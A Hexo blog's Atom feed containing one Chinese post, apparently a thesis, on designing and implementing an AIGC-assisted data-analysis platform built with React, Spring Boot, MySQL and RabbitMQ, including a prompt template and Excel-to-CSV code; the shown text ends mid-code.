<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>十二惊惶</title>
  
  <subtitle>犁牛之子骍且角，虽欲勿用，山川其舍诸</subtitle>
  <link href="https://shierjinghuang.github.io/atom.xml" rel="self"/>
  
  <link href="https://shierjinghuang.github.io/"/>
  <updated>2025-03-31T15:46:01.126Z</updated>
  <id>https://shierjinghuang.github.io/</id>
  
  <author>
    <name>十二惊惶</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>结合AIGC结合AIGC技术的数据分析平台的设计与实现</title>
    <link href="https://shierjinghuang.github.io/2025/03/31/%E7%BB%93%E5%90%88AIGC%E6%8A%80%E6%9C%AF%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <id>https://shierjinghuang.github.io/2025/03/31/%E7%BB%93%E5%90%88AIGC%E6%8A%80%E6%9C%AF%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</id>
    <published>2025-03-31T12:24:23.000Z</published>
    <updated>2025-03-31T15:46:01.126Z</updated>
    
    <content type="html"><![CDATA[<h2 id="结合aigc-结合aigc技术的数据分析平台的设计与实现">结合AIGC 结合AIGC技术的数据分析平台的设计与实现</h2><p>[TOC]</p><p><strong>摘要</strong>：由于数据规模和复杂度的增加，传统的数据分析手段已满足不了人们的需求，出现了 Google Analytics 等数据分析平台，这些数据分析平台专业性强，操作复杂，不易使用。随着 OpenAI 发布 ChatGTP，人工智能发展正式步入 AIGC 普及化的新阶段，能进行数据分析，实现更加人性化的服务。故结合 AIGC 技术，设计了智能化的数据分析平台。系统前端采用 React + Ant Desigin Pro 技术实现数据的可视化，后端采用 Spring Boot + MySQL + MyBatis Plus 实现各模块的功能。通过该平台用户只需要提供原始数据和分析目标，业务后端通过 AI 服务对用户的需求进行理解和分析，从而获得分析结果和可视化图表，减轻了数据分析工作，提高了数据分析的效率，降低了数据分析门槛。</p><p><strong>关键词</strong>：AIGC 数据分析 人工智能</p><h3 id="引言">引言</h3><p>随着 OpenAI 发布大语言模型 ChatGPT 的爆火，标志着大模型、生成式人工智能 （Artificial Intelligence Generated Content，AIGC）正式步入普及化新阶段，带来巨大的技术和范式改变^[1]^。借助快速积累的数据和强大的算力性能，人工智能能够模仿人类思维方式生成内容并与人交互^[2]^。以 ChatGTP 为代表的人工智能生成内容技术是人机交互发展中的重大突破，其颠覆了内容的生产、表达和互动形式，得到广泛应用，产生深远影响，预测到 2026 年超过 80%的企业将使用生成式 AI 的 API 或模型，或在生产环境中部署支持生成式 AI 的应用[3]。因此，在各行各业里，AIGC 将成为重要的支柱之一。</p><p>数据分析是任何现实情况下的处理问题前的必要任务，以提取模糊数据背后的信息并总结研究情况中的规律。 这有助于管理者做出决策，以便他们能够实施适当的策略和行动。但随着数据规模的增加与数据多样性的变化带来的复杂度的急剧增加，传统的数据分析处理复杂、工作量大、可视化不足、缺乏预测性等问题越发显著，降低了工作效率。同时，已知的数据分析平台专业性强、操作复杂，不能立即上手操作，不适合多数人满足数据分析的需求。</p><p>随着人工智能的快速发展，利用 AIGC 技术对海量语言和文本数据进行信息挖掘和内容理解成为可能。在当今信息复杂的环境中，数据质量参差不齐，任务种类繁多，导致了数据孤岛和模型孤岛的存在，AIGC 技术能够很好地解决传统语言处理技术的不足^[4]^。</p><p>数据分析平台前端负责与用户交互，后端负责控制和处理数据。基于普通用户需求，研究并设计结合 AIGC 技术的数据分析平台，在前端用户只需要提供原始数据和分析目标，在后端利用 AI 对用户的需求进行理解和分析，从而获得分析结果和可视化图表。前端为一个可视化 BI 界面，含有用户登录注册，图表分析，图表管理三大功能；后端安排数据库对数据进行管理，开发文件上传接口，AI 对接，以及异步化的实现。减轻了数据分析的工作，显著地提高了数据分析的效率，降低了数据分析门槛，更加人性化^[5]^。</p><h3 id="1-相关理论与技术介绍">1 相关理论与技术介绍</h3><h4 id="1-1-开发环境">1.1 开发环境</h4><p>本项目的开发过程中同时使用了 WebStorm 和 IntelliJ IDEA，二者都是 JetBrains IDE 系列的一部分。WebStorm 是一款由 JetBrains 公司开发的集成开发环境，其专门用于前端模块开发。拥有丰富的功能和工具，无需安装和配置大量插件，WebStorm 从一开始就包含了 JavaScript 和 TypeScript 开发所需的一切。帮助开发者更高效地编写、调试和测试 Web 应用程序。IntelliJ IDEA 同样是由 JetBrains 公司开发的一款集成开发环境。IntelliJ IDEA 具有智能代码完成、语法高亮、自动导入包等功能，支持 Java、Kotlin、Groovy 等多种编程语言。尤其对于 Java 和 Kotlin 有着无与伦比的兼容性。和 WebStorm 一样，IntelliJ IDEA 的生态提供了大量的插件，可以扩展 IDE 的功能。</p><h4 id="1-2-前端使用技术">1.2 前端使用技术</h4><p>前端的使用了 React+ Umi+ Ant Design Pro 创建前端用户界面，技术架构示意图，如图 1-1 所示。</p><ol><li>React ：React 是一个用于创建用户界面的库。React 不仅仅是一个库、一种架构，甚至不只是一个生态系统，它的应用甚至不局限于 Web 开发，它可以与其他库一起使用以渲染到特定环境^[6]^。</li><li>Umi ：Umi 是可扩展的企业级 react 前端应用框架，配以生命周期完善的插件体系，覆盖从源码到构建产物的每个生命周期，支持各种功能扩展和业务需求^[7]^。</li><li>Ant Design Pro ：Ant Design Pro 是一款前端脚手架，用户可以在已搭建好的基础框架上继续向上构建自己的设计和方案。</li></ol><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\前端技术的架构示意图.png"  /><center>图 1-1 前端技术的架构示意图 </center>#### 1.3 后端使用技术 <p>关于本平台后端的解决方案，在使用的技术，最底层为 Java 与 MySQL，使用RabbitMQ 作为中间件实现消息传递，在其上依次架构 EasyExcel、Hutool工具库、Swagger+Knife4j 项目接口文档等内容，最后服务层交由 AIGC 技术。后端的技术架构示意图，如图 1-2 所示。</p><ol><li>SpringBoot ：SpringBoot 是一个基于 Spring 的开源 Java 框架，使用 SpringBoot有效简化了 Spring 应用的配置和开发过程，是 Java 开发者最常使用的架构之一。</li><li>MySQL 数据库：MySQL 数据库是一种典型的关系型数据库，用于存储数据，具有体积小、占用空间小等特点^[8]^。</li><li>RabbitMQ：消息队列 RabbitMQ 是一款由 Rabbit Technologies 公司开发的，使用 Erlang 语言实现的，旨在实现 AMQP（Advanced Message Queuing Protocol 即高级消息队列协议）的开源消息中间件，具有可靠性、灵活性、高可拓展性。</li><li>AI 能力</li><li>EasyExcel ：EasyExcel 用于实现 Excel 的上传和数据的解析，可以实现在 Excel中完成读取、写入等任务。</li><li>Swagger + Knife4j 项目接口文档：Swagger 接口文档为前端调用后端代码的文件。根据后端的 Swagger 接口文档生成对应的前端请求 service 目录存储后端指定接口的方法代码。</li><li>Hutool 工具库：Hutool 工具库是一个存储了许多实用工具类的的 Java 工具库，能够减少开发者的工作量，更加快速的完成开发任务。</li></ol><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\后端技术的架构示意图.png"  /><center>图 1-2 后端技术的架构示意图 </center>#### 1.4 AIGC 技术 <p>从狭义角度，AIGC 技术是区别于专业生产内容、用户生产内容等传统内容创作模式的一种新型内容创作方式，其利用 AI 技术实现自动生成内容。从广义角度，AIGC 技术泛指内容自动化生成的技术集合。AIGC 既是从内容生产者视角进行分类，又是一种内容生产方式，还是用于内容自动化生成的一类技术集合^[5]^。AIGC 根据面向对象、实现功能的不同可分为：智能数字内容孪生、智能数字内容编辑、智能数字内容创作。AIGC+其他，推进数实融合，加快产业升级，提升产业效率和价值。</p><h4 id="1-5-分库分表">1.5 分库分表</h4><p>当设计一个网站时，一般会将各种表都存储在同一个数据库中，每个表中都包含着 大量的信息。当使用该网站的用户人数比较少，访问量也比较少的时候，单库单表不会出现问题。但当网站的用户数量大量增加，网站功能和业务不断复杂，一张表会拥有很多字段，单个字段拥有许多内容，且整张表存储大量数据，这样会导致不仅一张表的查询压力比较大，如果还关联查询，时间等各方面的压力都在增大。在数据库中使用分库分表对数据库进行拆分可以有效得解决大数据量和高并发的问题。</p><ol><li><p>垂直分表：</p><ul><li>当表中字段很多的时候，按照字段进行垂直切分，将表中字段分成两组。一般会将不常用的、数据较大的、长度较长的拆分为“扩展表”。</li></ul></li><li><p>水平分表</p><ul><li>当表中数据量很大的时候，将表中数据按照某种规则切分到不同的表中，以达到分担单张表的数据量和访问量的目的。有效得降低了单张表的数据量，提高了查询效率，而且可以通过增加节点，提高系统的扩展性和容错性。但事务并发处理复杂度增加，需要增加分布式事务的管理，性能和复杂度都有所牺牲，而且跨节点查询困难，需要设计跨节点的查询模块。因为这些表还是在同一个数据库中，并且表的数据是一 直在增加的，随着数据量增加，表的不断增多，数据库的压力也会增加。</li></ul></li><li><p>垂直分库</p><ul><li>当数据库中的表太多的时候，会根据业务逻辑对数据库进行垂直切割，分为不同的业务模块，将不同业务模块字段或表存储在不同的数据库中。垂直分库基于数据库内核支持，对应用透明，无需额外的开发代码，易于维护。同时不同的数据库可以储 存在不同的服务器上，可以有效解决磁盘空间、内存等空间不足问题。有效的降低了单个数据库的数据量。</li></ul></li><li><p>水平分库</p><ul><li>水平分库指在多个服务器上分别存储一张表里切分出来的不同数据，每个服务器有相应的库和表，仅是表中数据集合不同。</li></ul></li></ol><h4 id="1-6-限流">1.6 限流</h4><p>限流也称流量控制，在系统面临高并发，或者大流量请求的情况下，限制新的请求对系统的访问，从而保证系统的稳定性，常见的限流算法如下：</p><p><strong>固定窗口限流</strong></p><p>以单位时间段作为一个窗口，维护一个计数器，计数器记录这个窗口接收请求的次数。当请求次数少于限流阈值，就允许访问；当请求次数大于限流阈值，就拒绝访问；当当前的时间窗口结束^[9]^，计数器清零。在旧一个时段的结束和新的时段的开始各并发 不超过限流阈值的访问请求，虽然在一个单位时间段里 0-1s 和 1-2s 都没有超过限流阈值，但若将结束和开始划为一个单位时间段就已经超过了限流阈值，如图 1-3 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\流量突刺.png" style="zoom:50%;" /><center>图 1-3 流量突刺 </center>**滑动窗口限流** <p>滑动窗口限流解决了固定窗口限流的临界问题。以单位时间作为一个滑动窗口，通过将时间窗口划分为更小的时间单位，每个子窗口都有计数限制。随着时间推移，会用新的子窗口替代过期的子窗口，形成一种“滑动”效果。当滑动窗口的划分的子窗口越多，滑动窗口的滚动就越平滑，限流统计就越精确。但一旦达到限流阈值后，访问请求都会被直接拒绝，会损失一部分访问请求。</p><p><strong>漏桶限流</strong></p><p>以固定的速率处理任意速率过来的访问请求，当请求数量达到限流阈值后就会拒绝访问请求。在一定程度上能应对流量突刺，能够固定速率处理请求，保证服务器的安全。但没办法迅速处理一批请求，只能以固定速率按顺序一个一个处理。</p><p><strong>令牌桶限流</strong></p><p>令牌桶限流可以应对突发流量的情况，以固定速率往令牌桶中添加令牌，当令牌数量达到限流阈值，就会被丢弃。访问请求需要获取到令牌后才能被系统接受并处理这个请求的业务逻辑，如果没有获得令牌请求访问会被拒绝，如图 1-4 所示。该策略提高了机器的利用率。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\令牌桶限流.png" style="zoom:80%;" /><center>图 1-4 令牌桶限流 </center>#### 1.7 线程池  <p>线程池一般用于执行多个不相关联的耗时任务。没有多线程的情况下，任务顺序执行，使用了线程池的话可让多个不相关联的任务同时执行^[10]^。当用户提交了任务，但任务需要很长时间的时候，用户不需要在电脑前等待，而是会保存在数据库。若要添加新的任务会进行判断，若任务提交成功了，存在空闲的线程就立即执行，不存在就放入任务队列中等待被处理。若任务提交失败了，会拒绝任务不执行或者在程序空闲时将提交 失败的任务取出执行。线程池执行流程如图 1-5 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\线程池执行流程.png" style="zoom: 80%;" /><center>图 1-5 线程池执行流程 </center>### 2 需求分析与系统设计 <p>​本系统在参考传统数据处理平台设计的基础上进行了改进，将 AIGC 技术与其结合，打造了一款高效的数据处理平台。客户端在输入数据和需求后，请求发送至业务后端。 在需求繁忙时，系统会进行限流，将任务排队放置于消息队列中。一旦某个功能处理完毕并处于空闲状态，系统将通知任务处理模块，并将新任务分配给空闲功能。任务处理 模块调用 AI 服务和数据库，AI 服务异步生成图表和分析结果，并将反馈发送给任务处理模块，而数据库则负责保存处理任务数据。</p><p>​前端采用 React +Ant Design Pro 以及可视化开发库 Echarts；后端使用 Spring Boot框架，MySQL 数据库存储数据，利用 MyBatis Plus 数据访问框架建立联系，并实现消息队列的异步化处理和 AI 接入。</p><h4 id="2-1-系统需求分析">2.1 系统需求分析</h4><p>在科技进步和生活方式改变的背景下，数据记录已由传统的纸质手记转向更高效的计算机记录和备份。然而，在如今的大数据时代，传统的数据分析已无法满足人们挖掘数据中所需信息的需求。</p><ol><li>传统数据分析处理复杂、工作量大。利用数据挖掘和深度学习算法，提供有效的数据处理和数据简化能力</li><li>传统数据分析时效性差。引用异步化，降低处理时间。</li><li>传统数据分析可视化能力不足。通过 BI 平台，将结果以图表形式展现。</li><li>传统数据分析缺乏预测性。利用人工智能和大数据技术，对历史数据进行分析预测^[11]^。</li><li>现有数据分析平台专业性强，操作复杂。利用 AIGC 技术，对用户需求进行理解，帮助其生成需要内容，更加人性化。</li></ol><h4 id="2-2-总体设计">2.2 总体设计</h4><p>在传统的数据分析平台中，如果用户想要分析数据的变化趋势，需要用户自己手动导入初始数据，并根据平台提供的选择来选择自己需要的图表和字段，因为是平台提供的选项用户可能找不到符合自己预期的目标，最后再交给专业的数据分析师完成分析，并获得分析结论。但普通用户并不需要专业的数据分析师，需求很小，只是需要分析原始数据获得一张想要的分析图表。故设计一个系统，用户即使不会图表设计和数据分析，只要将原始数据导入平台，业务后端的 AI 模型会对用户的需求进行分析，并生成可视化图表和分析结论。平台大体设计如图 2-1 所示。</p><ol><li>智能分析：用户输入目标和原始数据，可以自动生成图表和分析结论</li><li>图表管理：用户可以对历史图表进行删除、修改和搜索查看</li><li>图表生成的异步化</li><li>对接 AI 能力</li></ol><p>同时，考虑到随着该平台的使用人数增多，考虑到平台的安全、平台的成本开销等</p><p>问题，做了以下优化设计：</p><ol><li>安全性：对文件类型、文件大小进行检验</li><li>数据存储：利用分库分表理论，解决存储压力</li><li>限流：利用令牌桶限流思路，限制用户访问请求</li></ol><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\系统设计图.png" style="zoom:80%;" /><center>图 2-1 系统设计图 </center>#### 2.3 异步化设计 <p>​面临服务处理能力有限，或者接口处理（或返回）时长较长时，采用了异步化。</p><ol><li>因为 AI 生成结果时间过长，用户需要等待时间过长</li><li>业务服务器可能面临大量请求，导致系统资源紧张，严重时甚至可能导致服务器宕机或无法处理新的请求。</li><li>调用第三方服务（AI 能力）的处理能力有限。比如每 3 秒只处理 1 个请求， 就会导致 AI 处理不过来；严重时，AI 可能会对我们的后台系统拒绝服务。</li></ol><p>​故当大量用户都有需求，每个人都需要等待 AI 提供结果，将会导致 AI 工作压力太大，可以采用消息队列技术。通过消息队列，用户可以提交生成图表的请求，这些请求会进入队列，AI 服务会依次处理队列中的请求，从而避免了同时处理大量请求造成的压力，同时也能更好地控制资源的使用。</p><ol><li>同步：一件事做完，再做另外一件事情</li><li>异步：在处理一件事的同时，可以处理另一件事情。当第一件事完成时，会收到一个通知告知你这件事已经完成，这样就可以进行后续的处理。通常，如果想将同步变为异步，必须知道何时任务已经完成[12]。因此，需要一个通知机制。</li></ol><p>​在用户需要进行长时间的操作时，点击提交后不需要在界面空等。而是先保存至数据库。然后，将用户的操作或任务添加到任务队列中，让程序或线程执行。由于程序的处理能力或线程数有限，可以先把待处理任务放入队列中等待。等空闲时，再按顺序执行，而不是直接拒绝，处理流程如图 2-2 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\异步化优化处理流程.png" style="zoom: 80%;" /><center>图 2-2 异步化优化处理流程</center> #### 2.4 登录注册模块设计 <p>用户需要使用平台的智能分析服务要先在登录页面进行登录。如果还没有注册过用户信息在登录过程中会报错，在登录页系统会对数据库已存储用户信息进行匹配，匹配成功即用户完成登录，否则返回错误信息。用户登录注册模块的具体流程如图 2-3 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\系统登录注册模块流程图.png" style="zoom:80%;" /><center>图 2-3 系统登录注册模块流程图 </center>#### 2.5 智能分析模块设计 <p>​AI 服务接口需要接收系统用户前端输入的分析目标和原始数据，以及可选择填写的图表类型和图表类型信息，但在 AI 接收系统用户提交的信息之前，后端需要对提交信息合法性进行校验，防止恶意攻击，保证系统的安全性。同时还要对系统使用次数进行统计和校验，以控制系统成本。最后，调用 AI 接口，将处理成 csv 格式的数据输入给AI 模型，AI 模型接受系统用户描述的需求进行分析，理解出用户想要什么，然后对 csv格式的数据进行分析处理，会按照系统用户描述的需求给出分析结论，如果系统用户提供了图表类型要求会按照系统用户要求生成图表代码，如果系统用户没有提供图表类型，AI 模型会提供一个 json 配置的图表代码，会先将 AI 模型生成的结果上传到数据库，然后前端获得数据库中的数据生成可视化图表界面。智能分析模块的具体处理流程如图 2-4 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\智能分析处理流程.png" style="zoom:67%;" /><center>图 2-4 智能分析处理流程</center> #### 2.6 库表和接口设计 <h5 id="2-6-1-库表设计">2.6.1 库表设计</h5><p>​数据分析平台的数据库中包含 2 个表：用户信息表 user、图表信息表 chart。用户信息表 user 主要用于存储用户登录和注册信息；图表信息表 chart 存储两次，一次用于存储用户提交的分析目标和原始数据，一次用于存储 AI 模型分析出的图表数据和分析结论。用户实体 E-R 图如图 2-5 所示，需求图表实体 E-R 图如图 2-6 所示，结果图表实体E-R 图如图 2-7 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\用户实体 E-R 图.png" style="zoom:80%;" /><center>图 2-5 用户实体 E-R 图 </center><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\需求图表实体 E-R 图.png" style="zoom:80%;" /><center>图 2-6 需求图表实体 E-R 图 </center><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\结果图表实体 E-R 图.png" style="zoom:80%;" /><center>图 2-7 结果图表实体 E-R 图</center><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\数据库 E-R 图.png" style="zoom:80%;" /><center>图 2-8 数据库 E-R 图 </center>**用户信息表 user** <blockquote><p>用户信息表 user 主要存放用户信息，其中 uid 是主键，如表 2-1 所示。</p></blockquote><center>表 2-1 用户信息表 user </center>| 列名          | 说明          | 类型          || ------------- | ------------- | ------------- || uid           | 用户 ID(主键) | bigint        || user_Account  | 账号          | varchar(256)  || user_Password | 密码          | varchar(512)  || user_Name     | 用户昵称      | varchar(256)  || user_Avater   | 用户头像      | varchar(1024) || user_Role     | varchar(256)  | varchar(256)  |<p><strong>需求图表信息表 chart1</strong></p><blockquote><p>需求图表信息表 chart1 主要存放了系统用户的分析需求，其中 xid 是主键，uid 是外键如表 2-2 所示。</p></blockquote><center>表 2-2 需求图表信息 chart1 </center>| 列名      | 说明              | 类型         || --------- | ----------------- | ------------ || xid       | 需求图表 id(主键) | bigint       || goal      | 分析目标          | text         || name      | 图表名称          | varchar(128) || chartData | 原始数据          | text         || chartType | 图表类型          | varchar(128) || uid       | 用户 ID（外键）   | text         |<p><strong>结果图表信息表 chart2</strong></p><blockquote><p>结果图表信息表 chart2 主要存放了系统 AI 模型生成的分析结果，其中jid是主键，xid 是外键，如表 2-3 所示</p></blockquote><center>表 2-3 结果图表信息 chart2 </center>| 列名       | 说明                | 类型     || ---------- | ------------------- | -------- || jid        | 结果图表 ID(主键)   | bigint   || genChart   | 生成的图表代码      | text     || genResult  | 生成的分析结论      | text     || xid        | 需求图表 id（外键） | bingint  || createTime | 创建时间            | datetime || updateTime | 更新时间            | datetime || isDelete   | 是否删除            | tinyint  |<h5 id="2-6-2-接口设计">2.6.2 接口设计</h5><p>​数据分析平台的接口目录有 3 个，分别为用户接口 UserController、图表接口 ChartController、文件接口 FileController。用户接口 UserController 主要用于系统用户的登录与注册，以及用户信息查询，用户接口信息如表 2-4 所示。</p><center>表 2-4 用户接口信息表 UserController </center>| 接口名称         | 说明                         || ---------------- | ---------------------------- || addUser          | 创建用户                     || deleteUser       | 删除用户                     || getUserById      | 根据 ID 获取用户（仅管理员） || getLoginUser     | 获取当前登录用户             || getUserVOById    | 根据 ID 获取包装类           || listUserByPage   | 分页获取用户列表（仅管理员） || listUserVOByPage | 分页获取用户封装列表         || userLogin        | 用户登录                     || userRegister     | 用户注册                     || userLogout       | 用户注销                     || updateUser       | 更新用户                     || updateMyUser     | 更新个人信息                 |<p>​图表接口 ChartController 主要用户智能分析 AI 接口的实现和系统用户对历史图表的管理，图表接口信息如表 2-5 所示</p><center>表 2-5 图表接口信息表 ChartController </center>| 接口名称          | 说明                           || ----------------- | ------------------------------ || addChart          | 创建图表接口                   || deleteChart       | 删除图表                       || editChart         | 编辑图表（用户）               || genChartByAi      | 智能分析                       || getChartById      | 根据 ID 获取图表信息           || listChartByPage   | 分页获取列表（封装类）         || listMyChartByPage | 分页获取当前用户创建的图表信息 || updateChart       | 更新图表（仅管理员）           |<p>​文件接口 FileController 主要用于系统用户数据文件的上传，以及安全性校验，文件接口信息如表 2-6 所示</p><center>表 2-6 文件接口信息表 FileController </center>| 接口名称   | 说明     || ---------- | -------- || uploadFile | 文件上传 |<h3 id="3-系统实现">3 系统实现</h3><h4 id="3-1-系统登录注册模块实现">3.1 系统登录注册模块实现</h4><p>​用户没有登陆时平台时不能显示功能的，当用户填写了用户名和密码，经后端校验正确后才能够使用该平台的功能，否则会提示用户名或密码错误，要求再次填写。而没有注册的用户需要先注册一下信息，将数据信息存入后端数据库才可以使用平台。</p><p>​在前端创建登录页和注册页用于给用户进入平台和填写账号密码。前端设计如图 3-1 所示。后端会对信息进行审核，没有问题后数据才会录进数据库中，后端显示结果如图 3-2 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\用户登录页面.png" style="zoom: 50%;" /><center>图 3-1 用户登录页面</center><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\注册成功后后端显示结果.png" style="zoom: 60%;" /><center>图 3-2 注册成功后后端显示结果</center>​为避免登陆再刷新后，页面返回登录页需要重新登陆，可以添加 cookie。通过 cookie前端可以知道后端已登陆，并告知后端哪个电脑端或客户端的登录状态。代码如下： <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//修改前端的全局请求，添加 cookie </span>withCredentials<span class="token operator">:</span> <span class="token boolean">true</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-2-智能分析模块实现">3.2 智能分析模块实现</h4><p>​根据需求设计，页面分为三个板块：智能分析板块、分析结论板块和可视化图表板块。其中，智能分析板块需要添加文本框、下拉按钮、文件上传按钮、提交按钮、重置按钮，都需要和后端数据库连接，获取数据。界面设计如图 3-3 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\智能分析板块设计.png" style="zoom: 50%;" /><center>图 3-3 智能分析板块设计</center>因为传输过来的是对象，需要找到数据真正对应的参数。代码如下： <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">const</span> res <span class="token operator">=</span> await <span class="token function">genChartByAiUsingPost</span><span class="token punctuation">(</span>params<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> values<span class="token punctuation">.</span>file<span class="token punctuation">.</span>file<span class="token punctuation">.</span>originFileObj<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​最后，用户提供分析目标和原始数据（必填项）后点击开始分析，待后端处理完成后，会显示数据分析结论和可视化图表。用户也可以自己选择图表类型，为了方便图表管理，用户可以为当前操作结果提供图表名称。操作示例如图 3-4 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\智能分析页面.png" style="zoom: 80%;" /><center>图 3-4 智能分析页面</center>#### 3.3 AI 服务接口实现 <p>AI 服务接口的实现主要在传入信息时对其进行要先进行处理，主要为提示语和数据压缩两个方面。</p><p><strong>AI 提问</strong></p><p>为了能让 AI 模型对系统用户描述的需求能够分析并理解成我们需要的样子，然后对输入的数据进行处理，输出我们想要的结果，需要对 AI 模型不断调整提问词，可以在以下三个方面实现：</p><p>​① 使用系统预设和控制输入格式，便于 AI 精确地理解我们的需求</p><p>​② 输出格式，便于 AI 返回的内容能够更加方便地为我们所用</p><p>​③ 指定一个示例问答，one-shot 或者 few-shot</p><p>下面是本系统设定的提示语 prompt：</p><p>你是一位数据分析师，也是一位前端开发的程序员，我会以一定格式给你输入一段csv 格式的数据，具体格式下：</p><pre class="line-numbers language-none"><code class="language-none">分析需求： （数据分析的需求或者目标） 原始数据： （csv 格式的原始数据，用,作为分隔符） 请根据以上内容，帮我按照指定格式生成内容，如： ----- &#123;前端 Echarts V5 的 option 配置对象 js 代码，合理地将数据进行可视化&#125;  ----- &#123;图表的描述，以及明确的数据分析结论，越详细越好&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据压缩</strong></p><p>​首先，在 ChartController.java 文件的 genChartByAi 接口方法中获取用户的输入和excel 文件。因为用户上传的原始数据的文件不适合直接上传，并且 AI 接口普遍有字数限制，需要对其进行压缩能够多传数据，以及 AI 模型输入的是数据而不是文件，需要将 excel 文件转为 csv。故在 ExcelUtils.java 文件中创建一个工具类 excelToCsv，使用 csv 对 excel 文件的数据进行提取和压缩。为防止数据不干净，还需要对其进行过滤。最后，在 genChartByAi 接口方法中调用工具类 excelToCsv 将压缩好的数据字符串。关键代码如下所示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//读取出数据 </span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map</span><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token keyword">try</span><span class="token punctuation">&#123;</span> list <span class="token operator">=</span> <span class="token class-name">EasyExcel</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>multipartFile<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">excelType</span><span class="token punctuation">(</span><span class="token class-name">ExcelTypeEnum</span><span class="token punctuation">.</span>XLSX<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">sheet</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">headRowNumber</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">doReadSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"表格处理错误"</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">CollUtil</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">//转为 csv </span><span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取表头 </span><span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">></span></span> headerMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> headerList <span class="token operator">=</span> headerMap<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token 